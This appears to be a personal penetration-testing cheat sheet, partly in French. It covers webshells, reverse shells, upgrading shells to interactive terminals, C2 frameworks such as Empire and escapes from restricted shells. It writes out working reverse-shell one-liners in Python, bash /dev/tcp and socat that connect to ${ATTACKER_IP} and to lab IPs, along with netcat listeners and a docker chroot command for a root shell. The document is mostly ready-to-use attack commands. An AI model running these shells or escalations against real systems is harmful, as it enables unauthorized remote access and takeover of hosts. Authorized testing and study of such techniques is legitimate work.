
# webshells

https://tools.kali.org/maintaining-access/webshells

[Kali Linux webshells](https://gitlab.com/kalilinux/packages/webshells)

# Shells

- [Reverse Shell Generator](https://www.revshells.com/)

[Shells - Hacktricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells)

https://metahackers.pro/reverse-shells-101/
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

Generating reverse shell commands: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#php



In terminal :
python3 -c 'import pty; pty.spawn("/bin/bash")'
or :
python -c 'import pty; pty.spawn("/bin/bash")'

check :
```bash
$ tty
tty
/dev/pts/0
```

better environment :

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/tmp
export TERM=xterm-256color
alias ll='ls -lsaht --color=auto'

can try with : 
```bash
$ ll
```

==> colors must appears

Then :

Ctrl + Z [Background Process]
stty raw -echo ; fg ; reset
stty columns 200 rows 200


## Interactive Shell

See: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

### Python reverse shell

Open a new python reverse shell

```bash
python -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ATTACKER_IP}",4445));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

In another shell :

```bash
nc -nvlp 4445
```

### Interactive shell

#### Interactive shell procedure for Linux

```bash
python -c "import pty; pty.spawn('/bin/bash')"
#OR
python3 -c "import pty; pty.spawn('/bin/bash')"
​
(press on your keyboard) Ctrl+Z
(press on your keyboard) Enter
​
#If bash shell
stty raw -echo
fg # (I won't see my keystrokes, this is normal)
(press on your keyboard) Enter
​
#If zsh shell
stty raw -echo;fg
(press on your keyboard) Enter
​
#Then adjusting the shell
export TERM=xterm-256color
#OR
export TERM=xterm
Then
stty rows 32 columns 151 #For the size, do stty size on your own terminal to determine the size
```



### Shell/Interractive

When the shell is non interactive, we can invoke an interactive shell (no feedback when entering commands), like this :

```bash
nc -vn 10.11.0.128 4444
(UNKNOWN) [10.11.0.128] 4444 (?) open
python -c 'import pty; pty.spawn("/bin/bash")'
student@debian:~$
```

Other ways :

[https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)

On Kali (listen):

```bash
$ socat file:`tty`,raw,echo=0 tcp-listen:4444
```

On Victim (launch):

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```


```bash
stty raw -echo ; fg ; reset
```

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")' 
ctrl + z 
stty raw -echo 
fg
```


```
stty raw -echo; fg
```



/bin/bash -i > /dev/tcp/192.168.119.191/443 0<&1 2>&1'

/bin/bash -i >& /dev/tcp/192.168.119.191/443 0>&1

wrapped :
bash -c '/bin/bash -i >& /dev/tcp/192.168.119.191/443 0>&1'

### Recomandations

check :

```bash
$ sudo nc -nvlp 443
listening on [any] 443 ...
connect to [192.168.119.191] from (UNKNOWN) [10.11.1.8] 32855
bash: no job control in this shell
bash-3.00$ tty
not a tty
bash-3.00$ 
```

`not a tty` means it's not interactive.


In terminal :
python3 -c 'import pty; pty.spawn("/bin/bash")'
or :
python -c 'import pty; pty.spawn("/bin/bash")'

check :
```bash
$ tty
tty
/dev/pts/0
```

better environment :

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/tmp
export TERM=xterm-256color
alias ll='ls -lsaht --color=auto'

can try with : 
```bash
$ ll
```

==> colors must appears

Then :

Ctrl + Z [Background Process]
stty raw -echo ; fg ; reset
stty columns 200 rows 200



### tl;dr cheatsheet
Cheatsheet commands:

Using Python for a psuedo terminal

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Using socat

```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

Using stty options

 ```bash
# In reverse shell
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

# In Kali
$ stty raw -echo
$ fg

# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>
```

get terminal size: 
`stty size`
=> report its size to 
`stty rows 56 columns 116`


# C2

- [Matrix](https://www.thec2matrix.com/matrix)

## Common C2 Frameworks

### Free

- [Metasploit Framework](https://www.metasploit.com/)
- [Armitage](https://web.archive.org/web/20211006153158/http://www.fastandeasyhacking.com/) is an extension of the Metasploit Framework - it adds a Graphical user interface and is written in Java, and is incredibly similar to Cobalt Strike.
- [Powershell Empire](https://bc-security.gitbook.io/empire-wiki/) and [Starkiller](https://github.com/BC-SECURITY/Starkiller) is another incredibly popular C2
- [Covenant](https://github.com/cobbr/Covenant)
- [Sliver](https://github.com/BishopFox/sliver)

### Paid

- [Cobal Strike](https://www.cobaltstrike.com/) is arguably one of the most famous Command and Control frameworks next to Metasploit.
- [Brute Ratel](https://bruteratel.com/)

## Powershell Empire

starkiller is the GUI for Powershell-Empire

- `uselistener LISTENER`: To select a listener
- `options`: options
- `set OPTION VALUE`: to set options to the listener
- `set Name NAME`
​- `set Host`
​









# Restricted shells

Check your shell

echo $SHELL

Check your PATH variable

echo $PATH

Check what commands the user can run

ls $PATH

Check GTFO bin for techniques to escape restricted shell or check this great paper.

Exemple :

```
ryuu@beta:~$ ls
-rbash: /usr/bin/python: restricted: cannot specify `/' in command names
```

Some tips :
https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/
https://d00mfist1.gitbooks.io/ctf/content/escaping_restricted_shell.html

https://gtfobins.github.io/

Dans un shell restreint, on peut tout de même lister les fichiers via l'auto-complétion ( [TAB] ) :

```
ryuu@beta:~$ /etc/[TAB][TAB]
Display all 127 possibilities? (y or n)
acpi/ cron.weekly/ gnome-app-install/ lsb-base/ rc2.d/ sysctl.d/
alternatives/ cups/ gnome-vfs-2.0/ modprobe.d/ rc3.d/ systemd/
apache2/ cupshelpers/ groff/ mono/ rc4.d/ terminfo/
apm/ dbus-1/ grub.d/ mysql/ rc5.d/ udev/
apparmor/ default/ gtk-2.0/ network/ rc6.d/ ufw/
apparmor.d/ defoma/ gtk-3.0/ NetworkManager/ rc.local update-manager/
... SNIP ...
```


exemple:
From : https://gtfobins.github.io/gtfobins/docker/#shell
We could execute the following command to get a root shell:
```
$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
